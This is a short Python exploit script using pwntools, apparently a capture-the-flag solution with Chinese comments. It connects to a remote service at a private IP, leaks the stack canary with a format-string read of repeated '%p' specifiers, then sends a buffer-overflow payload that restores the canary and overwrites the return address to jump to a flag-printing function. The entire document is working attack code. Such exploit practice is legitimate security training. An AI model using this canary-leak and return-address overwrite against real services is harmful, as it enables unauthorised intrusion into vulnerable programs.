from pwn import *

r = remote('172.17.243.199', 9999)

GET_FLAG = 0x00401000
FMT_TO_COOKIE = int((0x148 - 0x8) / 4)

banner = r.recvuntil(b': ')
print(banner.decode(errors='replace'))
# Format 获取 cookie
r.sendline(b'%p ' * 81)
line = r.recvline().decode().split()
cookie = line[FMT_TO_COOKIE]
stack_cookie = int(cookie, 16) 
print(f"stack_cookie: {hex(stack_cookie)}")

# 利用缓冲区溢出漏洞
payload = b'A' * 64 + p32(stack_cookie) + p32(0xdeadbeef) + p32(GET_FLAG)

r.sendline(payload)

try:
    data = r.recvall(timeout=5)
    log.info(f"Received:\n{data.decode(errors='replace')}")
except:
    data = r.recv(timeout=3)
    log.info(f"Received:\n{data.decode(errors='replace')}")